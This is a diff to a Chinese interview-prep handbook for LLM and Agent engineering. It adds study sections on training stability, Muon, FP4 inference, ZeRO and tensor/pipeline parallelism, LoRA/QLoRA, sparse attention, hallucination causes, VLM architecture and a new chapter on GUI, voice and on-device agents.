@@ -23,6 +23,7 @@
 12. 第 11 章 · 前沿论文与研究热点
 13. 第 12 章 · 系统设计题与综合实战
 14. 第 13 章 · Agent 工程分层架构与 Harness Engineering
+15. 第 14 章 · 应用形态专题：GUI·浏览器、语音与端侧 Agent
 
 ---
 
@@ -39,10 +40,10 @@
    - **L1 能说出**：30 秒内给出准确定义和一个反例（应对概念题、快问快答）；
    - **L2 能讲透**：讲清机制、边界条件和至少一个权衡（应对原理追问）；
    - **L3 能落地**：能画出架构图、说出踩过的坑、给出量化指标（应对系统设计题和项目深挖）。
-   手册中每个章节的习题都标注了目标档位——P5 岗位把绝大多数知识点打到 L2 即可，P7+/Staff 必须有一批 L3。
+   手册中各章习题以 ⭐ 难度与（基础/进阶/开放）标注，重点章会在题干注明资深考察意图。深度目标上，P5 岗位把绝大多数知识点打到 L2 即可，P7+/Staff 必须有一批 L3。
 3. **输出倒逼输入。** 每章末尾的面试题，请合上书先口述一遍再对答案。面试考的是「检索 + 组织 + 表达」，不是「认得」。读十遍不如讲一遍。
 
-**章节内的固定结构**：核心概念 → 机制原理（配图/伪代码）→ 常见误区与陷阱 → 高频面试题（标注档位与考察意图）→ 延伸阅读。建议第一遍只读「核心概念 + 面试题」做快速扫描，第二遍按学习路线精读机制部分，面试前 3 天只看「误区与陷阱」和各章的一页纸速记。
+**章节内的固定结构**：核心概念 → 机制原理（必要处配伪代码/结构化拆解）→ 常见误区与陷阱 → 高频面试题（标注 ⭐ 难度与考察意图）→ 延伸阅读。建议第一遍只读「核心概念 + 面试题」做快速扫描，第二遍按学习路线精读机制部分，面试前 3 天只看「误区与陷阱」和各章的一页纸速记。
 
 ---
 
@@ -105,6 +106,11 @@
      ——把模型调用变成"有界、有状态、经工具中介的任务执行"的工程化包裹层
      C 上下文→第2/4章 · T 工具→第5章 · L 生命周期/编排→第3/6章
      E 执行/沙箱→第10章 · O 可观测→第8章 · V 验证/评估→第8章 · G 治理/安全→第9章
+
+  ⟂ 横向应用形态（第 14 章）：⑭ GUI·语音·端侧
+     ——同一认知内核落到三种载体上的专题重构
+     GUI/浏览器→截图-动作循环、DOM vs 视觉取舍（承第5/11章）
+     语音→实时延迟预算与打断处理（承第10章） · 端侧→小模型能力边界+隐私离线（承第1/9章）
 ```
 
 **关键依赖关系（决定学习顺序）：**
@@ -113,6 +119,7 @@
 - **3 是枢纽**：推理范式决定了 2（提示怎么写）、4（记忆怎么注入）、5（工具何时调用）、6（角色如何分工）的具体形态。
 - **8 和 9 横切所有层**：评估与安全不是最后一步，而是从第一天就要埋的桩。
 - **harness 视角（第 13 章）把 Ⅱ–Ⅳ 串起来**：ETCLOVG 七层把分散的可靠性关切（上下文、工具、编排、沙箱、观测、评估、治理）统一为控制系统——harness 应被读作一张依赖结构图，而非可拆的组件清单。
+- **14 是横向的应用形态切片**：GUI·浏览器 / 语音 / 端侧不新增知识域，而是把 3（循环）、5（动作接口）、9（安全边界）、10（延迟与成本）的结论放进具体载体重新推导——面试常以「换个形态，你的架构哪一层要重做」考察迁移能力。
 - **12 是 Ⅰ–Ⅳ 的综合应用**，没有捷径，只能靠前面的积累自然长出来。
 - **11 相对独立**，适合碎片时间追踪，但面试中它是「这人有没有技术品味」的信号灯。
 
@@ -129,6 +136,8 @@
 | **大厂 AI 平台/中台**（字节/阿里/腾讯的 Agent 平台组） | 10 ≈ 8 > 7 > 9 | 规模化、稳定性、成本，八股与系统设计并重，流程长、轮次多 |
 | **传统企业/金融/政企的 AI 团队** | 4 > 9 > 10 | RAG 落地、数据安全、合规、私有化部署，务实，讨厌空谈 |
 | **量化/高频/精英小团队** | 1 > 3 > 11 | 智力密度测试：现场推导、代码、开放性问题，鄙视背诵，奖励原创思考 |
+
+> **岗位方向提示**：若目标岗位明确指向 **GUI/computer-use·浏览器 Agent、语音 Agent 或端侧 Agent**（浏览器自动化/RPA、实时语音对话、手机端智能体等团队），请在上表通用优先级之外**优先精读第 14 章**——这三类面试会把截图-动作循环、语音延迟预算、端侧模型取舍当作主线题而非加分题考察。
 
 ### 按岗位级别
 
@@ -151,6 +160,17 @@
 10. **安全与注入攻击**：Prompt Injection 的攻防现状、为什么「检测」不够、权限最小化——第 9 章
 
 > 经验法则：TOP 5 必须达到 L3；TOP 6–10 至少 L2；其余章节保证 L1 不留盲区。
+
+#### 2025H2–2026 快速上行考点
+
+以下四个方向自 2025 下半年起面试出现频率明显上升，传统题库覆盖不足，建议对照相应章节优先补齐：
+
+- **MCP 供应链安全**：恶意/被劫持 MCP Server、工具描述投毒与跨工具数据外泄——第 5、9 章
+- **Computer-use / 浏览器 Agent**：截图-动作循环、DOM vs 视觉方案取舍、操作安全边界——第 14 章专题精讲（机制溯源见第 5、11 章）
+- **Agentic RL 与 RLVR**：可验证奖励、多轮工具调用的训练范式——第 11 章
+- **KV-cache 成本工程与 harness 设计**：前缀稳定性、缓存命中率即成本杠杆——第 13 章（成本细节另见第 10 章）
+
+> 截至 2026 年中，这些方向在大模型原厂与 AI 应用独角兽面试中已从加分项变为资深岗常规追问点，Staff 面试常以此测「技术品味」。
 
 ---
 
@@ -278,6 +298,7 @@ LLM 基础原理
 │   ├── 整体结构：Encoder-only / Decoder-only / Encoder-Decoder
 │   ├── 核心组件：Token Embedding → N × (Attention + FFN) + Residual + Norm → LM Head
 │   ├── 现代 Decoder-only 标配（LLaMA 栈）：Pre-RMSNorm / SwiGLU / RoPE / GQA / MLA（大模型不绑定权重）
+│   ├── 训练稳定性组件：QK-Norm（Qwen3/Gemma 3/OLMo 2）、logit soft-capping（Gemma 2）、z-loss
 │   ├── 机理视角：残差流（residual stream）、FFN 存知识、Attention 做路由、induction head
 │   └── 为什么赢：并行化、长程依赖、可扩展性（对比 RNN/CNN）
 ├── 2. 注意力机制
@@ -307,9 +328,11 @@ LLM 基础原理
 │   └── 工程问题：token 计费、数字/拼写缺陷、chat template、一致性
 ├── 6. 训练流程
 │   ├── 预训练：Next-token Prediction、交叉熵/困惑度、数据工程、C≈6ND、稳定性
-│   ├── 低精度训练：FP8（blockwise scaling、DeepGEMM）；推理 FP8 主流、FP4 起步
+│   ├── 低精度训练：FP8（blockwise scaling、DeepGEMM）；推理 FP8 主流、FP4 进入主流（GPT-OSS 的 MXFP4 发布精度、Blackwell 上 NVFP4 规模化 serving）
+│   ├── 显存与并行：≈16 字节/参数（混合精度 AdamW）、梯度检查点、ZeRO-1/2/3（FSDP）、TP/PP/3D 并行
 │   ├── 数据墙：高质量语料约 2026–2032 见底（Villalobos et al. 外推、有争议）、合成数据与 model collapse
 │   ├── SFT：指令格式、质量 > 数量（LIMA）
+│   ├── PEFT：LoRA（W'=W+BA、r≪d、可合并零延迟）/ QLoRA（NF4 + 双重量化 + paged optimizer）、multi-LoRA serving
 │   ├── 蒸馏（Distillation）：教师 logits / 输出迁移；GKD、on-policy 蒸馏
 │   ├── RLHF：Reward Model(Bradley-Terry) + PPO + KL 惩罚、四模型并存、奖励过优化
 │   ├── DPO/SimPO/ORPO：闭式解、隐式奖励、离线、去 reference、失效模式
@@ -338,6 +361,7 @@ LLM 基础原理
 └── 10. 亚二次与新架构（2024-2026）
     ├── SSM：Mamba/Mamba-2（选择性机制、O(n) 复杂度、常数状态）
     ├── 线性注意力：GLA / DeltaNet / RWKV（去 softmax、RNN 式递推）
+    ├── 可训练稀疏注意力：NSA（DeepSeek）、MoBA（Moonshot）、DSA（V3.2 lightning indexer）——保精确检索的亚二次路
     ├── 混合架构：Jamba / Nemotron-H / Kimi Linear / Qwen3-Next（少量注意力层 + 线性层）
     └── 扩散 LM：LLaDA / Dream / Mercury（掩码扩散、双向、块并行解码）
 ```
@@ -360,6 +384,11 @@ LLM 基础原理
 - **SwiGLU 激活的 FFN**：`FFN(x) = (Swish(xW₁) ⊙ xW₃)W₂`，比 ReLU/GELU 效果更好（代价是多一个投影矩阵，FFN 隐藏层相应缩小为约 2/3）。
 - **RoPE 位置编码**（见 2.3）。
 - **GQA**（见 2.2）。
+
+**训练稳定性组件（2024-2026 增量，"Qwen3 相比 Qwen2 架构改了什么"的答案锚点）。** 规模与深度上去后 attention logits 会失控增长，引发 loss spike，新一代模型的应对：
+- **QK-Norm**：计算注意力分数前对 q、k 各做一次 RMSNorm，从源头压制 attention logit 爆炸——已是 Qwen3、Gemma 3、OLMo 2 的标配；"Qwen3 相比 Qwen2 改了什么"的标准答案就是"去掉 QKV bias、加上 QK-Norm"。
+- **logit soft-capping**：Gemma 2 用 `cap·tanh(logit/cap)` 给注意力/输出 logits 设软上限；因与 FlashAttention 类 kernel 适配不佳，Gemma 3 已改用 QK-Norm 替代。
+- **z-loss** 一句话：对 softmax 配分函数加 `log²Z` 惩罚、防止 logits 整体漂移（PaLM、MoE 训练常用）。
 
 **机理视角（区分"会用"和"懂"的分水岭）。** 把模型看成在一条**残差流（residual stream）**上读写：
 - **FFN 占模型参数约 2/3、占算力大头**，各层 FFN 以键值存储方式编码事实性知识（"FFN as key-value memory"，Geva et al. 2021）；而可解释的"概念方向/特征"主要来自对**残差流（residual stream）**本身的研究（Anthropic 的特征抽取、sparse autoencoder / dictionary learning 工作），不要把两者混成"第一层 FFN 输出概念方向"。
@@ -392,7 +421,7 @@ Attention(Q, K, V) = softmax(QKᵀ / √d_k) · V
 以 LLaMA-3-70B 为例（80 层、GQA 8 个 KV 头、d_head=128、FP16）：**每 token 的 KV cache = 2(K+V) × 80 × 8 × 128 × 2B = 320 KiB**；8K 上下文单请求即 2.5 GiB。若用 MHA（64 KV 头）则是 20 GiB——GQA 直接省 8×。这个量级解释了为什么"长上下文"本质上是显存工程问题。
 
 **稀疏/局部化注意力（补充考点）。**
-- **Sliding Window Attention**（Mistral）：每个 token 只看前后 W 个位置——**每 token 注意力计算与每层 KV 缓存从 O(n) 降到 O(W)**（全序列训练计算从 O(n²) 降到 O(nW)）；通过多层堆叠，感受野逐层扩张到 `L×W`，长程信息靠"接力"传递。
+- **Sliding Window Attention**：每个 token 只看前后 W 个位置——**每 token 注意力计算与每层 KV 缓存从 O(n) 降到 O(W)**（全序列训练计算从 O(n²) 降到 O(nW)）；通过多层堆叠，感受野逐层扩张到 `L×W`，长程信息靠"接力"传递。早期代表是 Mistral-7B（v0.1，注意 Mistral 后续版本已弃用 SWA）；当前代表实践是**滑窗层与全局层混合**：Gemma 2 以 1:1、Gemma 3 以 5:1 交替"局部滑窗:全局"层（Gemma 3 滑窗仅 1024），GPT-OSS 每隔一层用 128-token 滑窗层——**混合滑窗 + 全局层是当前主流形态**：少数全局层买回长程整合能力，多数滑窗层把 KV 压成常数。
 - **Attention Sink**（Xiao et al., StreamingLLM, 2023）：流式/无限长推理中发现，**最初几个 token（尤其第一个）会吸收大量注意力分数，成为"注意力沉淀"**——即使语义无关，一旦从窗口滑出，perplexity 就崩。保留"开头几个 sink token + 最近的滑动窗口"即可稳定做百万 token 级流式推理。这把"位置编码外推"问题部分转化成了"哪些 KV 必须留下"的工程问题。
 
 **MLA 的原理（2024-2026 新考点）。** DeepSeek 的做法（[技术报告 arXiv:2412.19437](https://arxiv.org/abs/2412.19437)）：
@@ -443,7 +472,7 @@ Attention(Q, K, V) = softmax(QKᵀ / √d_k) · V
 **Prefix Caching（前缀缓存）。** Agent 场景下同一 system prompt + 工具定义会在海量请求中重复出现。SGLang 的 RadixAttention、vLLM 的 Automatic Prefix Caching 把公共前缀的 KV 缓存起来复用，命中后 prefill 成本骤降——这是 Agent 基建里 ROI 最高的优化之一。
 
 **其他 KV 优化。**
-- **KV 量化**：FP8 KV cache 相比 FP16 省 2× 显存（相比 FP32 约 4×），质量损失小，vLLM 已原生支持；INT4 KV 是活跃研究方向。
+- **KV 量化**：FP8 KV cache 相比 FP16 省 2× 显存（相比 FP32 约 4×），质量损失小，vLLM 已原生支持；INT4/FP4 KV 量化也已走出论文、进入主流推理框架的生产选项（LMDeploy 的 INT4 KV cache、TensorRT-LLM 在 Blackwell 上的 FP4 KV cache 等），再省一半显存，代价是对长上下文精确召回更敏感，上线前需按任务实测。
 - **KV 驱逐**：H2O 等观察到注意力高度集中于少数"heavy-hitter" token，可丢弃低重要性 KV。
 - **KV offload**：把冷 KV 卸到 CPU/NVMe，需要时换回，用带宽换显存容量。
 - **结构级**：MLA（见 2.2）从根上把每 token KV 压到几百字节量级。
@@ -485,13 +514,37 @@ Attention(Q, K, V) = softmax(QKᵀ / √d_k) · V
 
 **稳定性工程。** warmup + cosine 衰减、梯度裁剪、bf16 混合精度（bf16 动态范围大、不易溢出，已取代 fp16 成为训练默认）；loss spike 的常见处置是回滚到上一个健康 checkpoint 并跳过问题数据批次。
 
-**低精度训练与推理（2024-2026 新考点）。** 训练侧，**FP8 混合精度**已进入一线：DeepSeek-V3 在 671B 规模上用 FP8（E4M3 前向 / E5M2 反向梯度）+ **细粒度 blockwise scaling**（激活按 1×128、权重按 128×128 分块缩放）+ 自研 DeepGEMM 算子验证了稳定性——粗粒度（per-tensor / per-channel）缩放在大模型的离群激活面前会发散，**分块缩放是 FP8 训练可用的关键**。推理侧，FP8（E4M3）已是 Hopper / Blackwell 上的主流 serving 精度（vLLM、TensorRT-LLM 原生支持，DeepSeek-V3 即以此部署），Blackwell 起 FP4（NVFP4 / MXFP4）开始落地；BF16/FP16 退为兜底精度。面试口径：低精度的核心矛盾是**离群激活（outliers）与缩放粒度的取舍**。
+**Muon 优化器（前沿岗加分题："K2 为什么不用 AdamW"）。** Muon 对**矩阵形参数**不再走 Adam 的逐元素自适应，而是把动量矩阵先做**正交化**（Newton-Schulz 迭代近似求正交因子）再更新——直觉是让更新在各方向上"等强度"推进、避免少数奇异方向主导；embedding/LM Head 等非矩阵参数仍配 AdamW。Kimi K2 用 **MuonClip**（Muon + **qk-clip**：按 attention logit 超限比例回缩 q/k 投影权重，压制 logit 爆炸这一 Muon 大规模训练的主要不稳因素）完成了 **1T 总参 MoE 的全程无 loss spike 训练**，官方口径是 token 效率（同数据量下的损失下降）优于 AdamW。面试一句话：**Muon 赢在矩阵结构感知带来的 token 效率，MuonClip 补上大规模稳定性短板**。
+
+**低精度训练与推理（2024-2026 新考点）。** 训练侧，**FP8 混合精度**已进入一线：DeepSeek-V3 在 671B 规模上用 FP8（E4M3 前向 / E5M2 反向梯度）+ **细粒度 blockwise scaling**（激活按 1×128、权重按 128×128 分块缩放）+ 自研 DeepGEMM 算子验证了稳定性——粗粒度（per-tensor / per-channel）缩放在大模型的离群激活面前会发散，**分块缩放是 FP8 训练可用的关键**。推理侧，FP8（E4M3）已是 Hopper / Blackwell 上的主流 serving 精度（vLLM、TensorRT-LLM 原生支持，DeepSeek-V3 即以此部署）；FP4 也已跨过"起步"阶段进入主流：OpenAI 的 **GPT-OSS** 直接以 **MXFP4** 作为发布权重精度（MoE 权重 4-bit，120B 单卡 80GB 可跑），**NVFP4** 在 Blackwell 上进入规模化 serving（TensorRT-LLM / vLLM 支持，NVIDIA 官方放出多款模型的 NVFP4 checkpoint）；BF16/FP16 退为兜底精度。面试口径：低精度的核心矛盾是**离群激活（outliers）与缩放粒度的取舍**。
+
+**训练显存口算与分布式并行（与 6ND FLOPs 配对的第二道必会口算）。** 混合精度 AdamW 全参训练的**静态显存 ≈ 16 字节/参数**：bf16 权重 2 + bf16 梯度 2 + fp32 master 权重 4 + fp32 一阶矩 4 + fp32 二阶矩 4；另加激活显存（随 batch×序列长度×层数增长，长上下文下会反超静态项）。经典演算题"**70B 全参要多少卡**"：70B×16B ≈ **1.12 TB 静态状态**——80GB 卡（A100/H100）光放静态态就要 ≥14 张，加上激活、通信 buffer 与并行开销，实践中 **16–32 张起步**。省显存三板斧：
+- **梯度检查点（activation checkpointing）**：只存层边界激活、反向时重算，省掉激活大头，代价约 **+30% 计算**（多一次前向）；
+- **ZeRO 三档**（DeepSpeed）：ZeRO-1 只切分**优化器状态**（16 字节里的 12 字节 ÷ DP 卡数）；ZeRO-2 再切**梯度**；ZeRO-3 连**参数**也切、用时 all-gather——显存最省但通信量增约 50%。**FSDP ≈ ZeRO-3** 的 PyTorch 原生实现；
+- 量化底模 + PEFT（QLoRA 路线，见 2.7）。
+
+**并行三件套（怎么把一个放不下的模型切开）。**
+
+| 并行 | 切什么 | 通信特征 | 适用域 |
+|---|---|---|---|
+| **TP 张量并行** | 层内：权重矩阵按行/列切 | 每层前/反向各 2 次 all-reduce，高频大流量 | 限高带宽域（NVLink），一般 ≤8 卡节点内 |
+| **PP 流水线并行** | 层间：按层切成 stage | 相邻 stage 点对点传激活，流量小 | 可跨节点；有 pipeline bubble，需 micro-batch（1F1B/interleaved）填充 |
+| **DP/ZeRO 数据并行** | 切数据（ZeRO 再切训练状态） | 梯度 all-reduce/reduce-scatter | 扩吞吐主力，规模最自由 |
+
+**选型口诀**：**节点内 TP、跨节点 PP/DP、显存不够上 ZeRO**；万卡级训练即 TP×PP×DP 的 **3D 并行**（Megatron-LM），超长序列再叠序列/上下文并行（见 2.3）。
 
 #### 2.7 后训练：SFT → 蒸馏 → RLHF → DPO → GRPO
 
 对齐与能力激发的流水线，面试几乎必问其一。
 
 **SFT（监督微调）。** 用 (指令, 回答) 示范教模型"格式与风格"。核心经验：**质量远比数量重要**——LIMA（Meta, 2023）证明约 1000 条精挑数据即可接近 RLHF 模型的表现；SFT 主要改变行为分布（怎么说），知识增量有限（知识主要靠预训练或 RAG）。
+
+**参数高效微调（PEFT）：LoRA / QLoRA（微调落地的默认起点，Agent 岗必会）。** 全参微调 70B 要 16–32 张卡（见 2.6 显存口算），多数场景负担不起——PEFT 用"冻结底模、只训小增量"把门槛降两个数量级：
+- **LoRA**（Hu et al., 2021）：冻结 W，训练低秩增量 `W' = W + (α/r)·BA`（`B∈ℝ^{d×r}`、`A∈ℝ^{r×k}`、秩 r≪d；A 高斯初始化、B 零初始化，保证训练起点等价原模型）。可训参数常仅 0.1–1%，优化器状态随之骤减；**推理前可把 BA 合并回 W——零额外延迟**。常见取值 r=8–64、α=16–32（经验上 α≈2r，缩放系数 α/r 控制增量幅度）；**加在哪些矩阵**：原论文只加 q/v 投影即有效，实践中加满全部线性层（q/k/v/o + FFN 三矩阵）效果更强（QLoRA 的结论之一）。
+- **QLoRA**（Dettmers et al., 2023）：底模量化为 **4-bit NF4**（按正态权重分位数设计的量化格式）+ **双重量化**（把量化常数再量化，每参数再省约 0.37 bit）+ **paged optimizer**（显存尖峰时把优化器状态换页到 CPU），LoRA 增量仍以 bf16 训练。经典账：**单张 48GB 卡微调 65B**（Guanaco）——对照全参的 16 字节/参数（65B ≈ 1TB），省了约两个数量级。
+- **LoRA vs 全参（必答取舍）**：数据少、任务窄（格式/风格/领域话术对齐）、多租户定制 → LoRA；大幅行为改变、注入大量新能力、长程 agent 轨迹训练 → 全参或 RFT。**为什么低秩有效**：任务适配的权重增量本身近似低秩（intrinsic dimension 低），低秩分解足以覆盖；但也因此 **LoRA 学新知识弱，更像"格式/风格适配器"**——Agent 的 tool-call 格式对齐用 LoRA 通常够，推理能力提升要靠 RL/全参。
+- **multi-LoRA serving**：S-LoRA / vLLM 支持共享一份底模、按请求动态挂载不同 adapter（unified paging 管理 adapter 显存），一张卡可服务成百上千个租户定制——"可合并（零延迟）"与"可热插拔（多租户）"是 LoRA 的两种部署形态。
+- 变体一句：**DoRA** 把权重更新分解为幅值 + 方向两部分分别学习，低秩下常比 LoRA 更接近全参效果。
 
 **蒸馏（Distillation，2024-2026 小模型路线的关键）。** 用强模型（teacher）生成回答或输出 logits，训练弱模型（student）模仿：
 - **输出级**：直接学 teacher 的回答文本（本质是高质量合成数据 SFT）——DeepSeek-R1-Distill 把推理能力蒸馏到 1.5B–70B（Qwen2.5-1.5B/7B/32B 与 Llama-3.1-8B/70B），是"用 RL 造教师、用蒸馏铺学生"的范例；
@@ -533,6 +586,15 @@ L_DPO = − E[ log σ( β·log π(y_w)/π_ref(y_w) − β·log π(y_l)/π_ref(y_
 **RLAIF / Constitutional AI**（Anthropic, 2022）：用模型自己按"宪法原则"生成偏好、自我批评修订，减少人工标注依赖，是规模化对齐的现实路径。
 
 **RL 基建与蒸馏新范式（工程岗加分）。** 大规模 RL 的系统瓶颈在 rollout 与权重同步：**veRL**（字节，hybrid-flow 架构，把训练与采样在同集群内灵活编排）与 **OpenRLHF**（基于 Ray 的分离式架构）是两套主流开源框架；异步 rollout 与 staleness 控制（允许多旧的 off-policy 样本）是核心工程权衡。蒸馏侧的两个新词：**GKD**（Generalized Knowledge Distillation，Agarwal et al. 2024）让学生在**自生成输出**上匹配教师分布，缓解"训练看教师轨迹、推理用自己分布"的错配；**on-policy distillation**（Thinking Machines, 2025）把"学生自采样 + 教师逐 token 打分"做成规模化流程，被描述为介于 SFT 与 RL 之间的低成本能力迁移路径。
+
+#### 幻觉的机理成因（"为什么大模型会幻觉"必考，浅答扣分）
+
+浅答只说"训练数据有错/覆盖不全"——这只是次要因素。深答分三层：
+- **训练目标层**：next-token MLE 奖励的是"在训练分布下最流畅的续写"，而非"真实"。事实断言在语料中往往只出现一次（singleton），模型没有足够统计量把"记住的"与"编得像的"区分开——生成一个高概率但错误的实体名，在交叉熵意义上几乎不受惩罚。叠加解码期的**采样随机性**，低概率的错误延续总有机会被采出来，并被后文"自圆其说"。
+- **知识边界层**：预训练没有显式的"我不知道"监督信号——语料里几乎没有"这个问题我答不上来"的自然示范，模型对自身知识边界**缺乏校准**，到了边界外仍按同样的方式流畅外推。
+- **评测激励层**（OpenAI 2025《Why Language Models Hallucinate》的核心论点）：主流基准**二值评分**——答对得分、答错与弃权同样零分（弃权甚至更亏），这在统计上**激励猜测**：即使一个校准良好、知道自己不确定的模型，在这种记分规则下的最优策略也是硬答而非弃权。幻觉因此被制度性地固化——不改评分规则（给"恰当弃权"记分、对自信错误重罚），训练侧的修补是逆水行舟。
+
+**缓解分层**：训练侧（拒绝/弃权数据、校准感知的奖励设计）→ 解码侧（事实性任务降温、自洽采样交叉验证）→ 检索侧（RAG 用外部证据落地，见第 4 章）→ 校验侧（引用核查、评估与可观测性，见第 8 章）。面试口径：**浅答训练数据，深答"训练目标 + 评测激励 + 校准"三层，再顺出分层缓解**。
 
 #### 2.8 Scaling Laws：从 Chinchilla 到推理时计算
 
@@ -593,6 +655,12 @@ L_DPO = − E[ log σ( β·log π(y_w)/π_ref(y_w) − β·log π(y_l)/π_ref(y_
 
 **系统性短板（面试必答的取舍）。** 固定大小状态是对序列的**有损压缩**：亚二次模型在**精确召回（associative recall）、in-context copy（"复述前文出现过的字符串"）类任务上系统性弱于 Transformer**，多篇 2024 年的实证研究反复验证了这一点；纯 Mamba 模型的 in-context learning 能力也明显受限。这正是它们没有取代 Attention 的原因。
 
+**可训练稀疏注意力：保精确检索的亚二次路线（2025 增量考点）。** 与"把历史压进固定状态"的线性路线正交：**不压缩，而是精确地选**——每个 query 只对被选中的 KV 块做标准 softmax 注意力，整体复杂度亚二次，但被选中 token 的信息**无损**：
+- **NSA**（DeepSeek，Native Sparse Attention，ACL 2025 最佳论文）：压缩粗粒度 token + 选择性保留细粒度 token 块 + 滑动窗口，三分支门控融合；**端到端可训练**（而非推理期事后稀疏化），且按 GPU block 对齐设计、拿得到真实加速；
+- **MoBA**（Moonshot）：上下文切块、gate 为每个 query 选 top 块——**MoE 思想搬进注意力**，可与全注意力无缝切换；
+- **DSA**（DeepSeek-V3.2 的 lightning indexer）：轻量索引头为历史 token 打分、每个 query 只取 top-k 进注意力，把 MLA 稀疏化，已在生产模型落地——NSA→MoBA→DSA 是同一条线从论文走向生产。
+与线性注意力的对比口径：**线性/SSM 是有损压缩状态，稀疏注意力是保留全部 KV、按需精确选取**——前者状态常数、省得更狠，后者保住精确召回能力，正面回应上一段的"系统性短板"。
+
 **业界收敛到"混合架构"。** 主流做法是**少量注意力层 + 大量 SSM/线性层**：注意力层负责精确召回与 in-context 能力，线性层承担廉价的逐 token 处理，整体接近 O(n) 成本与常数级状态显存。代表：
 - **Jamba**（AI21, 2024）：Mamba + Transformer 混合，支持 256K 上下文；
 - **Nemotron-H**（NVIDIA, 2025）：Mamba-2 + 注意力混合家族；
@@ -602,6 +670,18 @@ L_DPO = − E[ log σ( β·log π(y_w)/π_ref(y_w) − β·log π(y_l)/π_ref(y_
 **面试口径**："不是 Attention 不好，而是全 Attention 太贵；混合架构用少数注意力层买回精确检索能力，其余层走 O(n)。"
 
 **另一条轴：扩散语言模型（非自回归）。** 与"亚二次"正交的新范式是**掩码扩散 LM**：训练时随机掩码 token、让模型用**双向注意力**并行去噪，推理时按 block 迭代解码（而非逐 token 自回归）。代表：**LLaDA**（2025，8B 开源掩码扩散 LM）、**Dream**（2025，开源扩散 LM，块并行解码吞吐显著高于同规模自回归模型）、**Mercury**（Inception Labs, 2025，面向代码，主打超高 tokens/s）。优势：天然双向上下文、块级并行解码、适合代码编辑与"挖空填充"式任务；短板：缺乏成熟的 KV cache / prefix cache 生态，可控生成与长程连贯性仍弱于自回归主流。目前是自回归路线的有力补充，而非替代。
+
+#### VLM 架构基础（多模态 / GUI Agent 岗的前置知识）
+
+**主流拼接范式（LLaVA 范式，先答这个）。** 绝大多数开源 VLM 是三段拼接：**视觉编码器**（CLIP/SigLIP 系 ViT，用图文对比学习预训练，输出的 patch 特征天然与语言语义对齐）→ **投影层**（把视觉特征映射进 LLM 的 embedding 空间：最简是 **MLP**（LLaVA 路线）；或用 **cross-attention Resampler**（Q-Former / Perceiver Resampler 类，用固定数量的可学习 query 把任意多 patch 压成定长 token，控制序列开销）→ **LLM 主干**（视觉 token 与文本 token 拼在同一序列里走标准自回归）。对 LLM 而言，图像就是"一段外语 token"。
+
+**图像的 token 账与分辨率策略。** 一张图经 ViT 切 patch 后是**数百至数千个 token**（如 336×336、patch 14 → 576 token），高分辨率是主要成本来源。主流做法：**AnyRes / 切片**（LLaVA-NeXT 路线：原图切成若干子图各自过编码器 + 一张全局缩略图拼接）；**Qwen-VL 系的原生动态分辨率**：不切片、按原始分辨率直接产出变长 patch 序列，并用 **M-RoPE** 把位置编码分解为**时间 / 高 / 宽三个分量**——图像按二维坐标、视频再加时间维编码，文本退化为普通一维 RoPE，一套位置编码统一三种模态。
+
+**两条路线之争。** **适配器路线**（上述拼接，复用成熟视觉编码器与 LLM，训练便宜，是主流）vs **早期融合**（Fuyu：不要独立视觉编码器，图像 patch 线性投影后直接进 LLM，结构最简、天然任意分辨率，但训练代价高、效果长期未成为主流）。
+
+**训练两阶段。** ① **对齐预训练**：冻结视觉编码器与 LLM，只训投影层（图文 caption 对）；② **多模态指令微调**：解冻 LLM（常连同投影层，视觉编码器可选解冻），用多模态指令数据教会"看图对话/推理"。
+
+**为什么 Agent 面试考这个**：GUI Agent 岗必问 VLM 结构，且**高分辨率支持是 GUI grounding 的前提**——截图里的按钮/输入框只占几十像素，低分辨率编码后信息直接丢失，AnyRes / 原生动态分辨率决定了模型"看不看得清屏幕"（GUI grounding 与坐标预测详见第 14 章）。
 
 ---
 
@@ -625,6 +705,8 @@ L_DPO = − E[ log σ( β·log π(y_w)/π_ref(y_w) − β·log π(y_l)/π_ref(y_
 | 投机采样为何无损 | ⭐⭐ | 接受-拒绝的数学保证、Medusa 近似无损的限定 |
 | 亚二次与混合架构（Mamba/线性注意力）的取舍 | ⭐⭐ | O(n)+常数状态 vs 精确召回弱；为何收敛到混合 |
 | R1-Zero vs R1 训练管线、规则化奖励 | ⭐⭐ | 纯 RL 涌现 vs 冷启动 SFT；R1 四阶段 |
+| LoRA/QLoRA 原理与全参微调的取舍 | ⭐⭐ | 低秩假设、NF4/双重量化、单卡 48GB 调 65B 的账、multi-LoRA serving |
+| 训练显存口算（16 字节/参数）与 ZeRO/TP/PP 选型 | ⭐⭐ | "70B 全参要多少卡"；节点内 TP、跨节点 PP、显存不够 ZeRO |
 | FP8/FP4 低精度、基准饱和与污染检测 | ⭐ | blockwise scaling；MMLU-Pro/HLE/LiveCodeBench、Min-K%++ |
 | 蒸馏 / SFT 数据量质量经验（LIMA）/ perplexity 的局限 | ⭐ | 对齐直觉、小模型路线 |
 
@@ -791,6 +873,7 @@ L_DPO = − E[ log σ( β·log π(y_w)/π_ref(y_w) − β·log π(y_l)/π_ref(y_
 21. **"Mamba 会取代 Transformer" / "R1 是纯 RL 不要 SFT"**：亚二次架构在精确召回 / in-context copy 上系统性弱于注意力，业界收敛到"少量注意力层 + 线性层"的混合架构；同理，纯 RL 涌现推理的是 **R1-Zero**，发布的 **R1** 用的是含冷启动 SFT 的四阶段流水线。
 22. **KV Cache 让每步计算变成 O(1)**：它只消除历史 K/V 的重复投影（投影 O(t·d²)→O(d²)），新 query 对全部历史 key 的注意力仍是 O(t·d)——每步成本仍随序列线性增长，这也是 decode 带宽受限的根源。
 23. **权重绑定是大模型标配**：恰恰相反，LLaMA/Mistral/DeepSeek 等大模型均不绑定（`tie_word_embeddings=False`）；绑定是 GPT-2、Gemma 等小模型的常见做法。
+24. **LoRA 与全参微调只差在"省不省钱"**：LoRA 的本质是低秩适配器——任务增量低秩假设成立时（格式、风格、领域话术对齐）效果接近全参，但**学新知识、提升推理能力偏弱**；Agent 的 tool-call 格式对齐用 LoRA 通常够，推理能力提升要靠全参/RL；把 r 调大也不等价于全参（优化动态不同）。
 
 ---
 
@@ -945,7 +1028,7 @@ Prompt Engineering 与上下文工程
 - *为什么有效*：把多步问题分解为若干中间状态，每一步生成都在为下一步提供"工作记忆"（token 即工作记忆）；同时让问题落入模型预训练中见过的推理文本分布。
 - *Zero-shot CoT*（Kojima et al., 2022）：仅追加 "Let's think step by step" 即可触发，说明推理能力是潜藏的，触发器即可激活。变体如 Plan-and-Solve（先规划再解）、Least-to-Most（分解子问题依次求解）在分解粒度上做了细化。
